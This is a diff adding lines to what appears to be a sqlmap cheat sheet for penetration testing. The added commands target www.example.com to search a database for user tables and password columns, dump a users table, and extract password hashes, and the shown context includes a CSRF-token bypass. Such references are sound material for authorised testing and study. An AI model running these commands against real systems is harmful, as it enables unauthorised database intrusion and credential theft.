@@ -459,8 +459,14 @@ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name
 # Database Schema Enumeration
 sqlmap -u "http://www.example.com/?id=1" --schema
 
+# Search the Database (`-T` table, `-C` columns)
+sqlmap -u "http://www.example.com/?id=1" --search -T user -v 3
+sqlmap -u "http://www.example.com/?id=1" --search -C pass -v 3
+
 # Password Enumeration and Cracking
-sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
+sqlmap -u "http://www.example.com/?id=1" --passwords --batch --all
+sqlmap -r req.txt --batch --search -C pass -v 3
 
 # CSRF token bypass
 sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
